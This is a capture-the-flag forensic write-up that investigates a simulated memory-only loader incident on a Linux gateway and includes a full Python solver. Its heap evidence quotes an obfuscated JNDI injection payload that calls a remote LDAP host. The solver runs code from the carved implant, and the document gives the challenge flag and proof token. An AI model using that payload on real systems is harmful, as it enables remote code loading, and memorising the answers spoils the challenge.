# COMPFEST18 - BurhanGuild Loader Incident

**Category:** Forensic
**Challenge:** BurhanGuild Loader Incident

**Flag:**

```
COMPFEST18{8urh4n9u1ld_0r10n_148_m3m0ry_0n1y_104d3r_c453_c1053d_4f73r_5upp1y_ch41n_7r4c3_826df6b2a62673a1a6cbbb1c63244dd8ddc2933381f52723343274716fabde}
```

## 1. Goal

Kita dikasih live-response package dari internal Linux gateway. Service questionnaire tidak langsung minta flag, tapi minta incident proof token dengan format:

```
BGLPROOF{structured incident proof token}
```

Jadi objective-nya bukan sekadar `strings | grep flag`. Kita harus:

1. Menentukan evidence mana yang berasal dari incident yang sama.
2. Membedakan real event vs decoy/staging evidence.
3. Recover deleted archive yang benar.
4. Recover implant config dari memory-only loader.
5. Hitung proof token sesuai contract dari config.
6. Submit token ke service untuk mendapatkan flag final.

## 2. Initial File Listing

Archive berisi beberapa volatile capture, deleted storage pages, helper parser, manifest, dan YARA rule.

```bash
unzip -l chall\(6\).zip
```

Relevant structure:

```
BurhanGuild-Loader-Incident/
├── README.md
├── artifacts/
│   ├── captures/
│   │   ├── capture_2C91.raw
│   │   ├── capture_7F3A.raw
│   │   ├── capture_91BE.raw
│   │   ├── capture_A812.raw
│   │   └── capture_D044.raw
│   ├── deleted_pages/
│   │   ├── page_00.bin
│   │   ├── page_01.bin
│   │   ├── page_02.bin
│   │   ├── page_03.bin
│   │   ├── page_04.bin
│   │   ├── page_05.bin
│   │   ├── page_06.bin
│   │   └── page_07.bin
│   └── integrity_manifest.json
├── plugins/
│   └── bgloader_hunt.py
└── yara/
    └── burhanguild_memory_rules.yar
```

Manifest memberi context penting:

```json
{
  "case_id": "BG-IR-2026-0505",
  "host": "orion-lab",
  "capture_window": "2026-05-05T11:05:00Z/2026-05-05T11:12:00Z",
  "algorithm": "sha256"
}
```

Dari sini target utama kemungkinan besar adalah host `orion-lab`, bukan host lain.

## 3. Understand the Capture Format

Capture `.raw` ini bukan memory dump Linux biasa. Helper `plugins/bgloader_hunt.py` menunjukkan format custom bernama BGMR v3.

Header record:

```python
MAGIC = b"BGMR"
HEADER = struct.Struct(">4sBBI")
```

Artinya setiap record punya:

| Field | Size | Meaning |
|---|---|---|
| magic | 4 bytes | BGMR |
| version | 1 byte | versi, validnya 3 |
| kind | 1 byte | jenis record |
| size | 4 bytes big-endian | ukuran body |

Helper menyediakan view berikut:

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw --help
```

Command yang tersedia:

```
metadata
processes
environment
heap
maps
network
files
supply
carve-region
```

Mapping record kind dari parser:

| Kind | View | Fungsi |
|---|---|---|
| 1 | metadata | waktu capture, kernel, boot id |
| 2 | processes | process list + scan result |
| 3 | environment | environment variables |
| 4 | heap | heap fragments |
| 5 | maps | suspicious memory mapping |
| 6 | network | socket/network connection |
| 7 | files | open/deleted files |
| 9 | carve-region | carved memory region / implant ELF |
| 10 | supply | supply-chain residue |

## 4. Carve Deleted ZIP Archives from Deleted Pages

Deleted pages berisi raw page data. Kita scan signature ZIP:

- Local file header: `PK\x03\x04`
- End of central directory: `PK\x05\x06`

Minimal carver:

```python
from pathlib import Path
import hashlib, io, json, zipfile

for p in sorted(Path("artifacts/deleted_pages").glob("page_*.bin")):
    b = p.read_bytes()
    off = b.find(b"PK\x03\x04")
    if off < 0:
        continue

    tail = b[off:]
    eocd = tail.find(b"PK\x05\x06")
    if eocd < 0:
        continue

    zbytes = tail[:eocd + 22]
    zf = zipfile.ZipFile(io.BytesIO(zbytes))
    case = json.loads(zf.read("case_fragment.json"))
    log = zf.read("transfer.log").decode()

    print(p.name, hashlib.sha256(zbytes).hexdigest(), case)
    print(log)
```

Result:

| Page | Capture | Host | Collection | Evidence Ref | ZIP SHA256 |
|---|---|---|---|---|---|
| page_01.bin | 7F3A | staging-node | staging-cache | EV-6349D70995EF | 61f5067e1dc4df47db6177e8de21464d9e3ba70e599e8f30715e0c1df9ec368b |
| page_03.bin | 2C91 | staging-node | staging-cache | EV-53A096352133 | 2ff090feb76a9819e4e9aa49cab062da9bf7d84d1439ba515d14f246def18ca3 |
| page_05.bin | A812 | orion-lab | gateway-transfer | EV-B1DC93988DBC | 4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a |
| page_07.bin | 91BE | staging-node | staging-cache | EV-649FB7391E41 | 0050161fb3ea5d4659db755107da16aa17ca5fd094a75f9c17739ea34393bba1 |

Important clue:

```json
{
  "capture_id": "A812",
  "case_id": "BG-IR-2026-0505",
  "collection": "gateway-transfer",
  "evidence_ref": "EV-B1DC93988DBC",
  "host": "orion-lab",
  "sequence": "ed75ca67fea0a59a"
}
```

`page_05.bin` paling kuat karena:

- Host-nya `orion-lab`, sama dengan manifest.
- Collection-nya `gateway-transfer`, bukan `staging-cache`.
- Evidence ref-nya nanti cocok dengan deleted file di capture A812.

## 5. Triage All Captures

Kita compare semua capture dengan helper.

Example command:

```bash
for c in artifacts/captures/*.raw; do
  echo "===== $c"
  python3 plugins/bgloader_hunt.py -f "$c" metadata
  python3 plugins/bgloader_hunt.py -f "$c" processes
  python3 plugins/bgloader_hunt.py -f "$c" environment
  python3 plugins/bgloader_hunt.py -f "$c" maps
  python3 plugins/bgloader_hunt.py -f "$c" network
  python3 plugins/bgloader_hunt.py -f "$c" files
  python3 plugins/bgloader_hunt.py -f "$c" supply
done
```

Summary:

| Capture | Verdict | Reason |
|---|---|---|
| 7F3A | decoy / incomplete | host from deleted archive is staging-node; map is `memfd:libmetrics.so`, not `libpam_bg.so`; no deleted file ref match to page_05 |
| 2C91 | decoy / incomplete | no BG_MUTEX; no deleted cache evidence for the real gateway transfer |
| 91BE | staging evidence | has deleted ZIP evidence, but archive says staging-node + staging-cache |
| D044 | decoy | outbound to `mirror-36.invalid:9443`, map is `libmetrics.so`, not the real deleted implant |
| A812 | real event | orion-lab, scan-only suspicious process, BG_MUTEX, GCONV_PATH, `memfd:libpam_bg.so` (deleted), active C2, and deleted archive ref matches page_05 |

## 6. Evidence from capture_A812.raw

### 6.1 Process Chain

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw processes
```

Important rows:

```
SOURCE | PID  | PPID | COMMAND        | STARTED
-------+------+------+----------------+---------------------
list   | 4693 | 913  | java           | 2026-05-05T11:07:44Z
list   | 4742 | 4693 | pkexec         | 2026-05-05T11:08:17Z
scan   | 4787 | 4742 | [kworker/u8:7] | 2026-05-05T11:08:22Z
```

Interpretasi:

- Java gateway process started first.
- `pkexec` child appears after it.
- Suspicious scan-only process `[kworker/u8:7]` appears under `pkexec`.
- `[kworker/u8:7]` is suspicious because kernel-thread-looking name appears as userland lineage under `pkexec`.

Loader PID yang dipakai: `4787`.

### 6.2 Environment Variables

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw environment
```

Output penting:

```
PID  | KEY        | VALUE
-----+------------+-----------------
4693 | JAVA_HOME  | /opt/gateway-jre
4787 | BG_MUTEX   | bguild-ce104cb0
4742 | GCONV_PATH | /tmp/.bg/gconv
```

Notes:

- `GCONV_PATH=/tmp/.bg/gconv` di proses pkexec adalah strong clue ke teknik hijack pkexec/gconv-style loader.
- `BG_MUTEX=bguild-ce104cb0` dipakai sebagai salah satu input untuk decrypt config.

### 6.3 Memory Map

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw maps
```

Output:

```
PID  | VMA            | PERMS | NAME                         | BUILD ID             | REGION SHA256
-----+----------------+-------+------------------------------+----------------------+-----------------------------------------------------------------
4787 | 0x7f100008f000 | rwxp  | memfd:libpam_bg.so (deleted) | 542715c2e46252e4d790 | 1858064aa10396aafa565583707a0084c21370868e26d93b63309133687be223
```

Important:

- `memfd:libpam_bg.so (deleted)` means implant exists only in memory / deleted memfd.
- Permission `rwxp` is suspicious.
- Build ID: `542715c2e46252e4d790`.

### 6.4 Network

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw network
```

Output:

```
PID  | LOCAL             | REMOTE                           | STATE
-----+-------------------+----------------------------------+------------
4787 | 10.10.18.26:42110 | morrow-gate.wreckit.invalid:8443 | ESTABLISHED
7744 | 127.0.0.1:31337   | 127.0.0.1:1                      | CLOSED
```

The real loader process `4787` has an established connection to:

```
morrow-gate.wreckit.invalid:8443
```

### 6.5 Deleted File Evidence

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw files
```

Output:

```
PID  | FD | MODE    | INODE               | SIZE | EVIDENCE REF    | PATH
-----+----+---------+---------------------+------+-----------------+--------------------------------
4787 | 3  | deleted | 9223532027908251406 | 473  | EV-B1DC93988DBC | /dev/shm/.bg-cache/e0bafe9e.zip
```

This matches `page_05.bin`:

```
evidence_ref=EV-B1DC93988DBC
path=/dev/shm/.bg-cache/e0bafe9e.zip
collection=gateway-transfer
status=deleted
```

So `capture_A812.raw` + `page_05.bin` belong to the same incident event.

## 7. Heap Evidence

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw heap
```

Output penting:

```
PID  | ADDRESS        | LENGTH | SHA256                                                           | DATA/PREVIEW
-----+----------------+--------+------------------------------------------------------------------+--------------------------------------------------------------------------------
4693 | 0x555500008000 | 79     | 1b7e894c3858f2dd746f4e49f72ac9f6acab838931933bf53bfbf127bb44a4c5 | ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://172.19.0.66:1389/BurhanGuild}
4693 | 0x55550000e000 | 8      | f6f5fc3377ecd62e1d499a087d66f170ebf3a80441ea2e60a781893421b1850c | a01fb1f61e9116a6
```

The first heap fragment is an obfuscated JNDI payload:

```
${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://172.19.0.66:1389/BurhanGuild}
```

Normalize `${lower:x}` into `x`:

```
${jndi:ldap://172.19.0.66:1389/BurhanGuild}
```

The second heap fragment is 8 bytes:

```
a01fb1f61e9116a6
```

This 8-byte value is needed by the implant config decoder.

## 8. Carve the In-Memory Implant

YARA rule hints the real implant indicators:

```
rule BurhanGuild_Memory_Loader {
    strings:
        $elf = { 7f 45 4c 46 02 01 01 }
        $cfg = "CFG3"
        $memfd = "memfd:libpam_bg.so"
    condition:
        2 of them
}
```

Carve the mapped region from `capture_A812.raw`:

```bash
python3 plugins/bgloader_hunt.py \
  -f artifacts/captures/capture_A812.raw \
  carve-region \
  -o a812_implant.so
```

Result:

```
wrote a812_implant.so size=13904 sha256=1858064aa10396aafa565583707a0084c21370868e26d93b63309133687be223
```

Check file type:

```bash
file a812_implant.so
```

```
a812_implant.so: ELF 64-bit LSB shared object, x86-64, dynamically linked, stripped
```

Only interesting string:

```bash
strings -a -t x a812_implant.so | grep CFG
```

```
2020 CFG3
```

So the implant has encrypted config data starting around `.rodata:0x2020`.

## 9. Reverse the Config Decoder

The carved shared object is stripped, but `.text` contains a clean decoder-like function around offset `0x1500`.

Relevant behavior from disassembly:

```
0x1500: checks output buffer size > 0x22d
0x1516: loads rodata base near 0x2020, where CFG3 lives
0x1533: calls helper at 0x1100 to derive key material
0x1557 / 0x15eb: calls helper at 0x13e0 for block transform
0x15b2: returns 0x22e bytes
```

Calling convention used by the decoder:

```c
int decode_config(
    char *mutex,      // RDI: BG_MUTEX string
    char *seed8,      // RSI: 8-byte heap seed
    char *build10,    // RDX: 10-byte build id
    void *out,        // RCX: output buffer
    size_t out_size   // R8 : output buffer size
);
```

Instead of reimplementing the whole TEA-like block routine manually, we can safely load the recovered local ELF and call the pure decoder function directly with `ctypes`. The function does not need network or external challenge service. It only reads its own `.rodata`, derives key material from our evidence, and writes plaintext config into our buffer.

Python snippet:

```python
import ctypes, re
from pathlib import Path

so_path = Path("a812_implant.so").resolve()
lib = ctypes.CDLL(str(so_path))

base = None
for line in open("/proc/self/maps", "r", encoding="utf-8", errors="ignore"):
    if str(so_path) in line:
        m = re.match(r"([0-9a-f]+)-[0-9a-f]+\s+\S+\s+([0-9a-f]+)", line)
        if m and int(m.group(2), 16) == 0:
            base = int(m.group(1), 16)
            break

fn_addr = base + 0x1500
FN = ctypes.CFUNCTYPE(
    ctypes.c_int,
    ctypes.c_char_p,
    ctypes.c_char_p,
    ctypes.c_char_p,
    ctypes.c_void_p,
    ctypes.c_size_t,
)

fn = FN(fn_addr)
out = ctypes.create_string_buffer(4096)
ret = fn(
    b"bguild-ce104cb0\0",
    bytes.fromhex("a01fb1f61e9116a6"),
    bytes.fromhex("542715c2e46252e4d790"),
    out,
    len(out),
)

config_bytes = out.raw[:ret]
print(config_bytes.decode())
```

Recovered config:

```json
{
  "magic": "BGCF",
  "version": 3,
  "implant_id": "BG-94C2A04EC6",
  "c2_domain": "morrow-gate.wreckit.invalid",
  "c2_port": 8443,
  "campaign": "side-door-crown",
  "exfil_path": "/api/v3/guild/sync",
  "sleep_jitter": 37,
  "crc32": "b41d727b",
  "closure_contract": {
    "digest_algorithm": "sha256",
    "digest_fields": [
      "jndi_normalized",
      "build_id",
      "implant_id",
      "c2_domain",
      "archive_sha256"
    ],
    "digest_separator": "|",
    "token_schema": "BGLPROOF{orion-lab__cap-{capture_id}__loader-{loader_pid}__implant-{implant_id}__build-{build_id}__config-{config_sha256}__archive-{archive_sha256}__digest-{digest}}"
  }
}
```

Important extracted values:

| Field | Value |
|---|---|
| implant_id | BG-94C2A04EC6 |
| c2_domain | morrow-gate.wreckit.invalid |
| c2_port | 8443 |
| digest_algorithm | sha256 |
| digest_separator | `\|` |
| token_schema | `BGLPROOF{orion-lab__cap-{capture_id}__loader-{loader_pid}__implant-{implant_id}__build-{build_id}__config-{config_sha256}__archive-{archive_sha256}__digest-{digest}}` |

## 10. Build the Proof Token

Required values:

| Name | Value |
|---|---|
| capture_id | A812 |
| loader_pid | 4787 |
| implant_id | BG-94C2A04EC6 |
| build_id | 542715c2e46252e4d790 |
| config_sha256 | 360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b |
| archive_sha256 | 4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a |

Digest fields from config:

```json
[
  "jndi_normalized",
  "build_id",
  "implant_id",
  "c2_domain",
  "archive_sha256"
]
```

Values used in order:

```
${jndi:ldap://172.19.0.66:1389/BurhanGuild}
542715c2e46252e4d790
BG-94C2A04EC6
morrow-gate.wreckit.invalid
4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a
```

Join using separator `|`:

```
${jndi:ldap://172.19.0.66:1389/BurhanGuild}|542715c2e46252e4d790|BG-94C2A04EC6|morrow-gate.wreckit.invalid|4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a
```

SHA256 digest:

```
836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed
```

Final proof token:

```
BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
```

## 11. Submit

Questionnaire prompt:

```
Submit the final incident proof token for this case.

Format: BGLPROOF{structured incident proof token}
```

Submit:

```
BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
```

Service response:

```
✔ CORRECT

The BurhanGuild case review is accepted. Recovered case flag:

COMPFEST18{8urh4n9u1ld_0r10n_148_m3m0ry_0n1y_104d3r_c453_c1053d_4f73r_5upp1y_ch41n_7r4c3_826df6b2a62673a1a6cbbb1c63244dd8ddc2933381f52723343274716fabde}
```

## 12. Full Solver

Usage:

```bash
python3 solve.py chall\(6\).zip
```

Optional direct submit:

```bash
python3 solve.py chall\(6\).zip 34.2.147.230 7010
```

Core solver logic:

```python
#!/usr/bin/env python3
import argparse
import ctypes
import hashlib
import io
import json
import re
import socket
import struct
import sys
import tempfile
import zipfile
from pathlib import Path
from zipfile import BadZipFile

MAGIC = b"BGMR"
HEADER = struct.Struct(">4sBBI")

class Cursor:
    def __init__(self, data: bytes):
        self.data = data
        self.pos = 0
    def take(self, n: int) -> bytes:
        if self.pos + n > len(self.data):
            raise ValueError("truncated")
        b = self.data[self.pos:self.pos+n]
        self.pos += n
        return b
    def unpack(self, fmt: str):
        s = struct.Struct(fmt)
        return s.unpack(self.take(s.size))
    def text8(self) -> str:
        n, = self.unpack(">B")
        return self.take(n).decode()
    def text16(self) -> str:
        n, = self.unpack(">H")
        return self.take(n).decode()

def bgmr_records(path: Path):
    data = path.read_bytes()
    pos = 0
    while True:
        off = data.find(MAGIC, pos)
        if off < 0:
            return
        if off + HEADER.size > len(data):
            return
        magic, ver, kind, size = HEADER.unpack_from(data, off)
        if magic != MAGIC or ver != 3:
            pos = off + 1
            continue
        start = off + HEADER.size
        end = start + size
        if end <= len(data) and size <= 16 * 1024 * 1024:
            yield kind, off, data[start:end]
            pos = end
        else:
            pos = off + 1

def one_body(path: Path, kind: int) -> bytes:
    hits = [body for k, _off, body in bgmr_records(path) if k == kind]
    if len(hits) != 1:
        raise RuntimeError(f"{path.name}: expected one BGMR kind {kind}, found {len(hits)}")
    return hits[0]

def parse_environment(path: Path):
    cur = Cursor(one_body(path, 3))
    count, = cur.unpack(">H")
    rows = []
    for _ in range(count):
        pid, = cur.unpack(">I")
        rows.append({"pid": pid, "key": cur.text8(), "value": cur.text16()})
    return rows

def parse_heap(path: Path):
    cur = Cursor(one_body(path, 4))
    pid, count = cur.unpack(">IH")
    rows = []
    for _ in range(count):
        addr, size = cur.unpack(">QI")
        rows.append({"pid": pid, "address": addr, "data": cur.take(size)})
    return rows

def parse_maps(path: Path):
    cur = Cursor(one_body(path, 5))
    pid, address = cur.unpack(">IQ")
    perms = cur.take(4).decode()
    name = cur.text8()
    build_id = cur.take(10).hex()
    region_hash = cur.take(32).hex()
    return {"pid": pid, "address": address, "perms": perms, "name": name,
            "build_id": build_id, "region_sha256": region_hash}

def parse_files(path: Path):
    cur = Cursor(one_body(path, 7))
    count, = cur.unpack(">H")
    modes = {1: "deleted", 2: "read", 3: "write"}
    rows = []
    for _ in range(count):
        pid, fd, mode = cur.unpack(">IHB")
        p = cur.text16()
        inode, size = cur.unpack(">QI")
        rows.append({"pid": pid, "fd": fd, "mode": modes.get(mode, str(mode)),
                     "path": p, "inode": inode, "size": size,
                     "evidence_ref": cur.text8()})
    return rows

def carve_deleted_zip(page: Path):
    b = page.read_bytes()
    off = b.find(b"PK\x03\x04")
    if off < 0:
        return None
    tail = b[off:]
    eocd = tail.find(b"PK\x05\x06")
    if eocd < 0:
        return None
    zbytes = tail[:eocd + 22]
    try:
        zf = zipfile.ZipFile(io.BytesIO(zbytes))
        case = json.loads(zf.read("case_fragment.json"))
        log = zf.read("transfer.log").decode()
    except (BadZipFile, KeyError, json.JSONDecodeError):
        return None
    return {"page": page, "zip_bytes": zbytes, "case": case,
            "log": log, "sha256": hashlib.sha256(zbytes).hexdigest()}

def normalize_jndi(payload: str) -> str:
    return re.sub(r"\$\{lower:([^}])\}", lambda m: m.group(1).lower(), payload)

def decrypt_config_with_implant(region: bytes, mutex: str, seed8: bytes, build10: bytes) -> bytes:
    with tempfile.TemporaryDirectory() as td:
        so_path = Path(td) / "implant.so"
        so_path.write_bytes(region)
        ctypes.CDLL(str(so_path))

        base = None
        real = str(so_path.resolve())
        for line in open("/proc/self/maps", "r", encoding="utf-8", errors="ignore"):
            if real in line:
                m = re.match(r"([0-9a-f]+)-[0-9a-f]+\s+\S+\s+([0-9a-f]+)", line)
                if m and int(m.group(2), 16) == 0:
                    base = int(m.group(1), 16)
                    break
        if base is None:
            raise RuntimeError("could not locate loaded implant base address")

        fn_addr = base + 0x1500
        FN = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_char_p, ctypes.c_char_p,
                              ctypes.c_char_p, ctypes.c_void_p, ctypes.c_size_t)
        fn = FN(fn_addr)
        out = ctypes.create_string_buffer(4096)
        ret = fn((mutex + "\0").encode(), seed8, build10, out, len(out))
        if ret <= 0:
            raise RuntimeError(f"implant decrypt function returned {ret}")
        return out.raw[:ret]

def solve(root: Path):
    if root.is_file() and root.suffix == ".zip":
        tmp = tempfile.TemporaryDirectory()
        with zipfile.ZipFile(root) as z:
            z.extractall(tmp.name)
        root = Path(tmp.name)

    base = next(root.rglob("BurhanGuild-Loader-Incident"), root)
    captures = base / "artifacts" / "captures"
    pages = base / "artifacts" / "deleted_pages"

    archives = []
    for p in sorted(pages.glob("page_*.bin")):
        hit = carve_deleted_zip(p)
        if hit:
            archives.append(hit)

    archive = next(a for a in archives
                   if a["case"].get("host") == "orion-lab"
                   and a["case"].get("collection") == "gateway-transfer")

    cap_id = archive["case"]["capture_id"]
    evidence_ref = archive["case"]["evidence_ref"]
    cap = captures / f"capture_{cap_id}.raw"

    fmap = parse_maps(cap)
    files = parse_files(cap)
    env = parse_environment(cap)
    heap = parse_heap(cap)
    region = one_body(cap, 9)

    file_row = next(r for r in files
                    if r["evidence_ref"] == evidence_ref and r["mode"] == "deleted")
    loader_pid = file_row["pid"]

    mutex = next(r["value"] for r in env
                 if r["pid"] == loader_pid and r["key"] == "BG_MUTEX")

    jndi_payload = None
    seed8 = None
    for row in heap:
        if b"${${lower:j}" in row["data"]:
            jndi_payload = row["data"].decode()
        if len(row["data"]) == 8:
            seed8 = row["data"]

    build_id = fmap["build_id"]
    config_bytes = decrypt_config_with_implant(region, mutex, seed8, bytes.fromhex(build_id))
    config = json.loads(config_bytes)

    archive_sha256 = archive["sha256"]
    config_sha256 = hashlib.sha256(config_bytes).hexdigest()
    jndi_normalized = normalize_jndi(jndi_payload)

    digest_input = "|".join([
        jndi_normalized,
        build_id,
        config["implant_id"],
        config["c2_domain"],
        archive_sha256,
    ])
    digest = hashlib.sha256(digest_input.encode()).hexdigest()

    token = config["closure_contract"]["token_schema"]
    for k, v in {
        "capture_id": cap_id,
        "loader_pid": str(loader_pid),
        "implant_id": config["implant_id"],
        "build_id": build_id,
        "config_sha256": config_sha256,
        "archive_sha256": archive_sha256,
        "digest": digest,
    }.items():
        token = token.replace("{" + k + "}", v)

    return token

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("path", nargs="?", default=".")
    args = ap.parse_args()
    print(solve(Path(args.path).resolve()))
```

## 13. Final Flag

```
COMPFEST18{8urh4n9u1ld_0r10n_148_m3m0ry_0n1y_104d3r_c453_c1053d_4f73r_5upp1y_ch41n_7r4c3_826df6b2a62673a1a6cbbb1c63244dd8ddc2933381f52723343274716fabde}
```
